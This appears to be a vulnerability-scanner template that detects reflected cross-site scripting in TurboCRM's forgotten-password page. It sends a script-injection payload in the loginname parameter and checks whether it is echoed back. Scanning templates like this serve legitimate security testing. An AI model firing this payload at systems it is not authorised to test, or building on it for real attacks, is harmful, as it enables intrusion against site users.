http:
- matchers:
  - part: body
    type: word
    words:
    - '"><script>alert(document.domain)</script>'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
id: turbocrm-xss
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: TurboCRM contains a cross-site scripting vulnerability which allows
    a remote attacker to inject arbitrary JavaScript into the response returned by
    the application.
  metadata:
    max-request: 1
  name: TurboCRM - Cross-Site Scripting
  reference:
  - https://gist.github.com/pikpikcu/9689c5220abbe04d4927ffa660241b4a
  severity: high
  tags: xss,turbocrm,vuln
